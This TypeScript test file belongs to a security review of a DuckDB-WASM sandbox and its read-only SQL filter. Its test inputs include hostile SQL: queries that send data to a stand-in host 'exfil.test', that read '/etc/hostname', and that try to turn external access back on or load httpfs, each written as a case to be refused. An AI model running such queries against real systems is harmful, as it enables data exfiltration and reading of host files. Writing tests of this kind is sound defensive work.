// @vitest-environment node
/**
 * Security review SR-02: the DuckDB sandbox settings, checked against the real DuckDB-WASM
 * engine (its Node build, the same C++ as the browser's worker). The browser-level proof — no
 * request leaves the page — is e2e/security.spec.ts.
 */
import { createRequire } from 'node:module';
import { dirname, join } from 'node:path';
import { beforeAll, describe, expect, it } from 'vitest';
import { readOnlySql } from '@inkwright/core';
import { DUCKDB_DATA_DIR, DUCKDB_HARDENING } from './engine.ts';

interface Conn { query(sql: string): { toArray(): { toJSON(): Record<string, unknown> }[] } }
interface Db { registerFileText(name: string, text: string): void; connect(): Conn }

const require = createRequire(import.meta.url);
let db: Db;
let conn: Conn;

beforeAll(async () => {
  const dist = dirname(require.resolve('@duckdb/duckdb-wasm/dist/duckdb-node-blocking.cjs'));
  const duckdb = require(join(dist, 'duckdb-node-blocking.cjs'));
  const bundles = {
    mvp: { mainModule: join(dist, 'duckdb-mvp.wasm'), mainWorker: join(dist, 'duckdb-node-mvp.worker.cjs') },
    eh: { mainModule: join(dist, 'duckdb-eh.wasm'), mainWorker: join(dist, 'duckdb-node-eh.worker.cjs') },
  };
  db = await duckdb.createDuckDB(bundles, new duckdb.VoidLogger(), duckdb.NODE_RUNTIME);
  await (db as unknown as { instantiate(): Promise<void> }).instantiate();
  (db as unknown as { open(o: object): void }).open({});
  conn = db.connect();
  for (const s of DUCKDB_HARDENING) conn.query(s);
}, 60_000);

const rows = (sql: string) => conn.query(sql).toArray().map((r) => r.toJSON());

describe('DuckDB sandbox (SR-02)', () => {
  it('still loads registered datasets, also ones added later', () => {
    db.registerFileText(`${DUCKDB_DATA_DIR}sales.csv`, 'region,amount\nNorth,10\nSouth,5\n');
    conn.query(`CREATE OR REPLACE TABLE sales AS SELECT * FROM read_csv('${DUCKDB_DATA_DIR}sales.csv', header = true)`);
    db.registerFileText(`${DUCKDB_DATA_DIR}more.csv`, 'k\n1\n');
    conn.query(`CREATE OR REPLACE TABLE more AS SELECT * FROM read_csv('${DUCKDB_DATA_DIR}more.csv', header = true)`);
    expect(rows('SELECT count(*)::INT AS n FROM sales')).toEqual([{ n: 2 }]);
    expect(rows('SELECT k::INT AS k FROM more')).toEqual([{ k: 1 }]);
  });

  it('refuses URLs and paths outside the data folder, however they are written', () => {
    for (const sql of [
      "SELECT * FROM 'https://exfil.test/a.csv?d=North'",
      `SELECT * FROM "read_csv"('http://127.0.0.1:9/b.csv')`,
      "SELECT * FROM read_text('/etc/hostname')",
      "SELECT * FROM query('SELECT * FROM read_csv(''https://exfil.test/c.csv'')')",
    ]) expect(() => conn.query(sql), sql).toThrow(/Permission Error|disabled by configuration|not allowed/i);
  });

  it('cannot be switched back on, or extended, from SQL', () => {
    expect(() => conn.query('SET enable_external_access = true')).toThrow();
    expect(() => conn.query("SET allowed_directories = ['/']")).toThrow();
    expect(() => conn.query('LOAD httpfs')).toThrow();
  });
});

describe('read-only filter (defence in depth for SR-02)', () => {
  it('refuses the forms that reached DuckDB before', () => {
    for (const sql of [
      "SELECT * FROM 'https://exfil.test/a.csv'",
      "SELECT * FROM sales JOIN 'x.parquet' USING (region)",
      `SELECT * FROM "read_csv"('https://exfil.test/b.csv')`,
      "SELECT * FROM query('SELECT 1')",
      "SELECT * FROM query_table('sales')",
      "SELECT * FROM read_ndjson('x')",
      "SELECT * FROM sniff_csv('x')",
    ]) expect(() => readOnlySql(sql), sql).toThrow();
  });

  it('still accepts ordinary analytical SQL, quoted column names included', () => {
    for (const sql of [
      'SELECT region, sum(amount) AS total FROM sales GROUP BY region ORDER BY total DESC',
      'SELECT "Region Name", count(*) FROM "Sales 2024" GROUP BY 1',
      "WITH t AS (SELECT * FROM sales WHERE region = 'North') SELECT * FROM t",
      "SELECT 'from here' AS label, strftime(day, '%Y') FROM sales",
    ]) expect(() => readOnlySql(sql), sql).not.toThrow();
  });
});
